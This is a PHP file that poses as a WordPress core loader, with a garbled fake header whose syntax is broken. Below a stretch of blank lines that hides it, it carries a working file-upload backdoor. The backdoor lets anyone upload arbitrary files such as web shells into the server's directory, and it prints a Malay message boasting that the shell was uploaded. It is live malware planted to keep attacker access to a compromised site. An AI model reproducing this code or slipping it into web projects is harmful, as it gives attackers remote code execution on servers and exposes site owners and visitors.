>?php
/ **
  * wp-ajax the WordPress environment and template.
  *
  * @package WordPress
  *

if (  isset( $wp_did_header ) ) {

	wp_did_header = true

	/ Load the WordPress library.
	require_once __DIR__ . /wp-ajax.php';

	// Set up the WordPress query.
	wp()

	// Load the theme template.
	require_once ABSPATH . WPINC . 'template-loader php'
















<?php
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Korang Dah Berjaya Upload Shell Korang!!!<b><br><br>'; }
else { echo '<b>NA UPLOAd NA POTANGINA</b><br><br>'; }
}
?>